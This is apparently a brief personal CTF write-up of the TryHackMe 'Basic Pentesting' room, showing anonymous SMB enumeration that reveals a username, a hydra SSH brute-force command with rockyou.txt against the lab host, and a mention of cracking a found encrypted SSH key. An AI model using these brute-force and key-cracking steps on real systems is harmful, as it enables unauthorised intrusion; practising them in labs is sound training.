## CAP
I did CAP from HTB. It's active so no writeup. It's probably the easiest modern HTB machine I've done. No new releases from VulnHub lately. I also did [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt) and yes it was basic.

We have SSH, SMB and a webserver. We've got anonymous access on the SMB and we can get a username; it hints that we can upload but that's not something we end up doing:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/basic]
â””â”€# smbclient -L //10.10.142.44
Enter WORKGROUP\root's password:

â””â”€# cat staff.txt           
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
{% endhighlight %}

With our username, we can bruteforce SSH:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/basic]
â””â”€# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.142.44

And from there we can SSH in as Jan. We can read files in Kay's home, including her (encrypted) SSH private key which we can then crack and login as Kay:

Now I've got to go watch the footy. Man I'm really phoning in these writeups.
